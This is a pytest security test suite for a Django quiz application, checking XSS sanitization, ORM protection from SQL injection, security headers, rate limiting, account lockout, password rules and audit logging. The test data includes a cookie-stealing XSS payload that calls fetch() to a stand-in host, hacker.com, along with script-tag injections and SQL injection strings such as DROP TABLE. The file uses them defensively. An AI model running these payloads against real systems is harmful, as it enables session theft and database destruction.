"""
Security, OWASP, Rate Limiting, Brute-Force, and Sanitization integration tests.
According to DOC-SEC-01 (SECURITY.md) and development_plan.md Phase 10.
"""

import time
import pytest
from unittest.mock import MagicMock, patch
from django.core.cache import cache
from django.test import Client, RequestFactory
from django.http import HttpResponse

from apps.authentication.models import User
from apps.authentication.security import (
    sanitize_html,
    sanitize_plain_text,
    AccountLockoutManager,
    validate_password_strength,
    LOCKOUT_THRESHOLD,
)
from apps.quizzes.services import QuizCRUDService
from apps.quizzes.models import Quiz
from core.middleware.security_headers import SecurityHeadersMiddleware
from core.middleware.rate_limit import SlidingWindowRateLimitMiddleware
from core.middleware.audit_log import AuditLogMiddleware


@pytest.fixture
def test_teacher(db):
    cache.clear()
    return User.objects.create_user(
        username="sec_teacher",
        email="secteacher@eduself.uz",
        password="ValidPassword123",
        role="teacher",
    )


# ==============================================================================
# 1. OWASP A03: XSS (Cross-Site Scripting) Sanitization Tests
# ==============================================================================

def test_xss_script_tags_stripped():
    """Xavfli <script> teglari tozalanishini tekshirish."""
    malicious_input = "<script>alert('XSS_ATTACK');</script>Oddiy savol matni"
    cleaned = sanitize_html(malicious_input)

    assert "<script>" not in cleaned
    assert "alert('XSS_ATTACK');" not in cleaned
    assert "Oddiy savol matni" in cleaned


def test_xss_event_handlers_stripped():
    """img/onerror, a/onclick kabi hodisa atributlari tozalanishini tekshirish."""
    payload = '<img src="invalid.jpg" onerror="fetch(\'https://hacker.com?c=\' + document.cookie)">'
    cleaned = sanitize_html(payload)

    assert "onerror" not in cleaned
    assert "hacker.com" not in cleaned


def test_xss_plain_text_cleans_all_tags():
    """sanitize_plain_text barcha HTML teglarni to'liq olib tashlashini tekshirish."""
    payload = "<b>Qalin matn</b> <a href='javascript:alert(1)'>Havola</a>"
    cleaned = sanitize_plain_text(payload)

    assert cleaned == "Qalin matn Havola"
    assert "<" not in cleaned
    assert ">" not in cleaned


@pytest.mark.django_db
def test_quiz_service_sanitizes_xss_on_creation(test_teacher):
    """Viktorina va savol yaratilganda xavfli XSS avtomatik zararsizlantirilishi."""
    xss_prompt = "<script>stealCookies()</script>O'zbekiston mustaqillikka qachon erishgan?"
    quiz = QuizCRUDService.create_quiz(
        owner=test_teacher,
        title="<script>alert(1)</script>Tarix Testi",
        subject="Tarix",
    )
    assert "<script>" not in quiz.title
    assert "Tarix Testi" in quiz.title

    question = QuizCRUDService.add_question(
        quiz=quiz,
        data={
            "type": "single_choice",
            "prompt": xss_prompt,
            "options": [
                {"id": "opt_1", "text": "1991-yil"},
                {"id": "opt_2", "text": "1990-yil"},
            ],
            "correct_answer": "opt_1",
            "points": 1000,
            "time_limit_seconds": 30,
        },
    )
    assert "<script>" not in question.prompt
    assert "stealCookies" not in question.prompt
    assert "O'zbekiston mustaqillikka qachon erishgan?" in question.prompt


# ==============================================================================
# 2. OWASP A03: SQL Injection (SQLi) Protection Tests
# ==============================================================================

@pytest.mark.django_db
def test_sqli_in_orm_queries_neutralized(test_teacher):
    """SQL Injection yuklamalari ORM orqali xavfsiz parametrlashtirilishini tekshirish."""
    sqli_payloads = [
        "' OR '1'='1",
        "admin' --",
        "'; DROP TABLE quizzes_quiz; --",
        "1 UNION SELECT 1, 'admin', 'pass' --",
        "' OR 1=1 #",
    ]

    for payload in sqli_payloads:
        # ORM xavfsiz filtrlashi va bazani buzmasdan bo'sh ro'yxat qaytarishi kerak
        results = Quiz.objects.filter(title=payload)
        assert list(results) == []

        user_lookup = User.objects.filter(username=payload)
        assert list(user_lookup) == []

    # Baza jadvallari buzilmaganligini tekshirish
    assert Quiz.objects.count() >= 0


# ==============================================================================
# 3. OWASP A05: Security Headers Middleware Tests
# ==============================================================================

def test_security_headers_present_on_response():
    """Javoblarda majburiy xavfsizlik sarlavhalari mavjudligini tekshirish."""
    factory = RequestFactory()
    request = factory.get("/")
    middleware = SecurityHeadersMiddleware(lambda req: HttpResponse("OK"))
    response = middleware(request)

    # 1. Content-Security-Policy
    csp = response.headers.get("Content-Security-Policy", "")
    assert "default-src 'self'" in csp
    assert "object-src 'none'" in csp
    assert "frame-ancestors 'none'" in csp

    # 2. Clickjacking himoyasi
    assert response.headers.get("X-Frame-Options") == "DENY"

    # 3. MIME sniffing himoyasi
    assert response.headers.get("X-Content-Type-Options") == "nosniff"

    # 4. Referrer Policy
    assert response.headers.get("Referrer-Policy") == "strict-origin-when-cross-origin"

    # 5. Permissions Policy
    assert response.headers.get("Permissions-Policy") == "geolocation=(), microphone=(), camera=()"


# ==============================================================================
# 4. Redis Sliding Window Rate Limiting Tests
# ==============================================================================

def test_sliding_window_rate_limiting_enforced():
    """Belgilangan limitdan oshganda HTTP 429 Too Many Requests qaytarilishini tekshirish."""
    cache.clear()
    factory = RequestFactory()
    middleware = SlidingWindowRateLimitMiddleware(lambda req: HttpResponse("OK"))

    # Login uchun limit 5 ta/daqiqa
    login_request = factory.post("/auth/login/", REMOTE_ADDR="192.168.1.100")

    # Dastlabki 5 ta so'rov muvaffaqiyatli o'tadi
    for i in range(5):
        resp = middleware(login_request)
        assert resp.status_code == 200, f"Request {i+1} failed"

    # 6-so'rov limitdan oshgani uchun bloklanadi (HTTP 429)
    blocked_resp = middleware(login_request)
    assert blocked_resp.status_code == 429
    assert "Retry-After" in blocked_resp.headers
    assert int(blocked_resp.headers["Retry-After"]) >= 1


def test_rate_limiting_exempt_paths():
    """Health check va statik fayllar limitdan ozod qilinganini tekshirish."""
    cache.clear()
    factory = RequestFactory()
    middleware = SlidingWindowRateLimitMiddleware(lambda req: HttpResponse("OK"))

    health_request = factory.get("/health/")
    for _ in range(10):
        resp = middleware(health_request)
        assert resp.status_code == 200


# ==============================================================================
# 5. OWASP A07: Brute-Force Himoyasi (Account Lockout) Tests
# ==============================================================================

@pytest.mark.django_db
def test_brute_force_lockout_after_five_failed_attempts(test_teacher):
    """Ketma-ket 5 marta xato parol kiritilganda hisob va IP 15 daqiqaga bloklanishi."""
    cache.clear()
    client = Client()

    # 4 marta xato parol kiritish -> 401 Unauthorized
    for _ in range(4):
        resp = client.post(
            "/auth/login/",
            {"username": "sec_teacher", "password": "WrongPassword!"},
            content_type="application/json",
            REMOTE_ADDR="10.0.0.50",
        )
        assert resp.status_code == 401

    # 5-marta xato parol kiritish -> chegara yetdi va 429 qaytariladi
    resp5 = client.post(
        "/auth/login/",
        {"username": "sec_teacher", "password": "WrongPassword!"},
        content_type="application/json",
        REMOTE_ADDR="10.0.0.50",
    )
    assert resp5.status_code == 429
    assert "bloklandi" in resp5.json()["error"]

    # 6-marta hatto to'g'ri parol kiritilganda ham blok holati tufayli rad etiladi!
    resp6 = client.post(
        "/auth/login/",
        {"username": "sec_teacher", "password": "ValidPassword123"},
        content_type="application/json",
        REMOTE_ADDR="10.0.0.50",
    )
    assert resp6.status_code == 429


@pytest.mark.django_db
def test_successful_login_resets_lockout_counter(test_teacher):
    """Muvaffaqiyatli kirish xato urinishlar hisoblagichini tozalashini tekshirish."""
    cache.clear()
    client = Client()

    # 3 marta xato kiritildi
    for _ in range(3):
        client.post(
            "/auth/login/",
            {"username": "sec_teacher", "password": "WrongPassword"},
            content_type="application/json",
            REMOTE_ADDR="10.0.0.51",
        )

    # 4-marta to'g'ri parol kiritildi -> hisoblagich tozalanadi
    ok_resp = client.post(
        "/auth/login/",
        {"username": "sec_teacher", "password": "ValidPassword123"},
        content_type="application/json",
        REMOTE_ADDR="10.0.0.51",
    )
    assert ok_resp.status_code == 200

    # Hisoblagich tozalanganligi sababli blok bo'lmasligi kerak
    is_locked, _ = AccountLockoutManager.is_locked("sec_teacher", "10.0.0.51")
    assert is_locked is False


# ==============================================================================
# 6. Password Strength Validation Tests
# ==============================================================================

def test_password_strength_validation():
    """NIST va OWASP bo'yicha parol mustahkamligi qoidalari."""
    # Juda qisqa
    valid, msg = validate_password_strength("Short1")
    assert not valid
    assert "kamida 8 ta" in msg

    # Raqamsiz
    valid, msg = validate_password_strength("NoDigitsHere")
    assert not valid
    assert "kamida bitta raqam" in msg

    # Harfsiz
    valid, msg = validate_password_strength("1234567890")
    assert not valid
    assert "kamida bitta harf" in msg

    # Keng tarqalgan oson parol
    valid, msg = validate_password_strength("password123")
    assert not valid
    assert "keng tarqalgan" in msg

    # Yaroqli kuchli parol
    valid, msg = validate_password_strength("StrongP@ssw0rd2026")
    assert valid
    assert msg is None


# ==============================================================================
# 7. Audit Log Middleware Tests
# ==============================================================================

def test_audit_log_middleware_logs_mutations():
    """Muhim mutatsiya va auth amallari audit logiga tushishini tekshirish."""
    factory = RequestFactory()
    request = factory.post("/auth/login/", REMOTE_ADDR="192.168.1.55")
    request.user = MagicMock()
    request.user.is_authenticated = False

    middleware = AuditLogMiddleware(lambda req: HttpResponse("OK", status=200))

    with patch("core.middleware.audit_log.logger.info") as mock_logger:
        response = middleware(request)
        assert response.status_code == 200
        mock_logger.assert_called_once()
        log_json = mock_logger.call_args[0][0]
        assert "security_audit" in log_json
        assert "/auth/login/" in log_json
        assert "192.168.1.55" in log_json
